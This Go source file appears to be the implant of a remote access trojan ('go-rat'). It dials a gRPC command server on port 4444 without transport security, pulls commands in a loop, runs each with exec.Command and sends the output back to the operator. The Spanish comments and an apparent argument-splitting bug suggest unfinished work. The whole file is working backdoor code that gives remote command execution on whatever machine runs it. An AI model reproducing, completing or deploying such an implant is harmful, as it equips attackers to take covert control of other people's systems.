package main

import (
	"context"
	"github.com/charmbracelet/log"
	"github.com/iortego42/go-rat/grpcapi"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
	"os/exec"
	"strings"
)

func main() {
	var (
		opts   []grpc.DialOption
		conn   *grpc.ClientConn
		err    error
		client grpcapi.ImplantClient
	)
	opts = append(opts, grpc.WithTransportCredentials(insecure.NewCredentials()))
	conn, err = grpc.NewClient("127.0.0.1:4444", opts...)

	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()

	client = grpcapi.NewImplantClient(conn)
	ctx := context.Background()
	for {
		var req = new(grpcapi.Empty)

		cmd, err := client.FetchCommand(ctx, req)
		// log a eliminar
		if err != nil {
			log.Fatal("[!] Error al obtener un commando.", "ERROR", err)
		}
		if cmd.In == "" {
			//time.Sleep(100)
			continue
		} else {
			log.Info("[+] Comando recibido del servidor.", "CMD", cmd.In)
		}
		tokens := strings.Split(cmd.In, " ")
		var c *exec.Cmd
		if len(tokens) == 1 {
			c = exec.Command(tokens[0])
		} else if len(tokens) >= 1 {
			c = exec.Command(tokens[0], tokens[:1]...)
		}
		// Cambiar en un futuro a stderr y stdout
		buf, err := c.CombinedOutput()
		if err != nil {
			cmd.Out = err.Error()
		}
		cmd.Out += string(buf)
		_, err = client.SendOutput(ctx, cmd)
		if err != nil {
			log.Fatal(err)
		}
		log.Info("[*] Resultado enviado al administrador.")
	}
}
